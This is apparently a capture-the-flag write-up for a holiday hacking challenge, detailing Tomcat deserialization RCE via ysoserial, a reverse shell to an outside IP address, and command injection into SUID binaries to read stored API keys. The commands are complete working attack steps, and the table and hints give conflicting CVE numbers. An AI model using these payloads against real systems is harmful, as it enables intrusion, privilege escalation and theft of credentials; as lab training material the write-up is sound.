---
layout: default
title: act3_snowcat_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act3_hack-a-gnome_mjd.html">Previous Objective: Act3 Hack-a-Gnome </a></th>
  <th><a href="/HHC_2025/index.html">Table of Contents</a></th>
  <th><a href="/HHC_2025/act3_schrodingersscope_mjd.html">Next Objective: Act3 Schrodinger's Scope</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Snowcat RCE and Privilege Escalation</th>
<th>Difficulty Level: 3</th>
</tr>
</thead>
<tbody>
<tr>
<td>Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.</td>
<td>Location: Grand Hotel</td>
</tr>
</tbody>
</table>
<p>
<h2>Solution Overview</h2>
<br>
</p>
<p>
Starting with an account with minimal access to the system, the website was found to be running Apache Tomcat version 9.0.90. This version is susceptable to a Remote Code Execution (RCE) vulnerability. This vulnerability was exploited to gain the privileges of the web application service account. Three binaries were discovered with Set User ID (SUID), a special permission in Unix/Linux systems that allows a file to run with the privileges of the file owner rather than the user executing it. These files were susceptable to command injection, allowing commands to be executed as a user with higher privileges. This enabled access to the authorized_keys file.
<br>
</p>
<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Error message leaks version information</td>
<td>Reconnaissance</td>
<td>T1593</td>
<td>Search Open Websites/Domains</td>
</tr>
<tr>
<td>Leverage Unauthenticated Remote Code Execution (RCE) in Apache Tomcat (CVE-2025-24815)</td>
<td>Initial Access</td>
<td>T1190</td>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Abuse SUID binaries</td>
<td>Privelege Escalation</td>
<td>T1548.001</td>
<td>Abuse Elevation Control Mechanism: Setuid and Setgid</td>
</tr>
<tr>
<td>Command Injection leading to Privilege Escalation</td>
<td>Execution</td>
<td>T1059.004</td>
<td>Command and Scripting Interpreter : Unix Shell</td>
</tr>
</tbody>
</table>
<p>
<h2>Detailed Solution</h2>
<br>
</p>
<details>
<p>
<summary>Click to expand</summary>
<br>
</p>
<p>
Using a nonexistent URL (http://localhost/nonexistant), an error message was triggered revealing that the system is running a potentially vulnerable version of Tomcat.
<br>
</p>
<p>
<img src="/HHC_2025/images/snowcat_version.jpg" alt="Tomcat Version Evidence">
<br>
</p>
<p>
Testing identified the CommonsCollections6 gadget could effectively deliver a payload. The initial approach was to touch a file in the /tmp directory to confirm a successful attack.
<br>
Payload details:
<br>
</p>
<pre><code class="language-sh">
java -jar /home/user/ysoserial.jar CommonsCollections6 'touch /tmp/pwned' > payload.bin
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
ls -la /tmp/pwned 2>/dev/null && echo "SUCCESS with touch!" || echo "Failed"
</code></pre>
<p>
The initial payload was delivered and successful:
<br>
</p>
<p>
<img src="/HHC_2025/images/snowcat_initialpayload.jpg" alt="Tomcat Initial Payload Evidence">
<br>
</p>
<p>
To achieve a remote shell, the following approach was used:
<br>
</p>
<ol>
<li>Setup a linux machine in linode, and start a netcat listener on port 4444</li>
<li>As the low level user, create a shell code in the /tmp directory</li>
<li>Change permissions on the file to allow other users to access and execute</li>
<li>Send a payload to set the SUID on the shell file</li>
<li>Send a payload that uses setsid to detach the process completely from the invoking script and run the shell</li>
</ol>
<p>
The shell file used was:
<br>
</p>
<pre><code class="language-sh">
bash -i >& /dev/tcp/69.164.211.205/4444 0>&1
</code></pre>
<p>
The payload used to set the SUID was:
<br>
</p>
<pre><code class="language-sh">
java -jar /home/user/ysoserial.jar CommonsCollections6 'chmod u+s /tmp/reverse_shell.sh' > payload.bin
<!-- Get session ID -->
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
<!-- Upload payload -->
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
<!-- Trigger payload -->
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
</code></pre>
<p>
Initial payloads failed, due to the payload script completing before the shell was established, killing the shell. Using setsid to detach the shell process from the script, allowed it to establish the connection.
<br>
</p>
<p>
The payload used setid and ran the shell was:
<br>
</p>
<pre><code class="language-sh">
java -jar /home/user/ysoserial.jar CommonsCollections6 'setsid bash /tmp/reverse_shell.sh >/dev/null 2>&1 &' > payload.bin
<!-- Get session ID -->
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk '{print $7}')
<!-- Upload payload -->
curl -s -X PUT -H "Content-Length: $(wc -c < payload.bin)" -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" --data-binary @payload.bin "http://localhost/${SESSION_ID}/session" > /dev/null
<!-- Trigger payload -->
curl -s -H "Cookie: JSESSIONID=.${SESSION_ID}" "http://localhost/" > /dev/null
</code></pre>
<p>
This resulted in access as the identity running the web service:
<br>
</p>
<p>
<img src="/HHC_2025/images/snowcat_serviceaccount.jpg" alt="Snowcat Service Account User">
<br>
</p>
<p>
Three binaries were discovered that the service account has access to with the SUID set:
<br>
These binaries have SUID set:
<br>
</p>
<ul>
<li>/usr/local/weather/humidity</li>
</ul>
<ul>
<li>/usr/local/weather/pressure</li>
</ul>
<ul>
<li>/usr/local/weather/temperature</li>
</ul>
<p>
The commands are run with a valid key:
<br>
</p>
<ul>
<li>/usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
</ul>
<ul>
<li>/usr/local/weather/humidity 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
</ul>
<ul>
<li>/usr/local/weather/pressure 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</li>
</ul>
<p>
The weather user has access to the /usr/local/weather/keys directory. This was our target:
<br>
</p>
<p>
<img src="/HHC_2025/images/snowcat_keys.jpg" alt="Keys Directory">
<br>
</p>
<p>
The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:
<br>
</p>
<pre><code class="language-">
/usr/local/weather/temperature "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6';cat /usr/local/weather/keys/* > /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo '"
</code></pre>
<p>
Viewing the contents of the file revealed:
<br>
</p>
<pre><code class="language-">
cat /tmp/keys.txt
4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
8ade723d-9968-45c9-9c33-7606c49c2201
</code></pre>
<p>
The first key listed is the one used with the temperature binary. The second key is not used by snowcat.
<br>
</p>
<p>
<strong>Answer: 8ade723d-9968-45c9-9c33-7606c49c2201</strong>
<br>
</p>
</details>
<p>
<h2>Tools Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>ysoserial.jar</td>
<td>Version: v0.0.6 Release Date: June 28, 2022</td>
</tr>
<tr>
<td>Linux Linode System</td>
<td>Ubuntu 24.04 LTS</td>
</tr>
<tr>
<td>netcat</td>
<td>v1.10-50</td>
</tr>
<tr>
<td>curl</td>
<td>8.11.0</td>
</tr>
</tbody>
</table>
<p>
<h2>Hints Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.</td>
</tr>
<tr>
<td>Santa</td>
<td>Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.</td>
</tr>
<tr>
<td>Santa</td>
<td>If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.</td>
</tr>
<tr>
<td>Thomas Hessman</td>
<td>We've lost access to the neighborhood weather monitoring station. There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing. Can you help me exploit the vulnerabilities and retrieve the other application's authorization key? Enter the other application's authorization key into the badge. If Frosty's plan works and everything freezes over, our customers won't be having the best possible experience-they'll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.</td>
</tr>
</tbody>
</table>
<p>
<h2>Acknowledgements</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>none</td>
<td>none</td>
</tr>
</tbody>
</table>
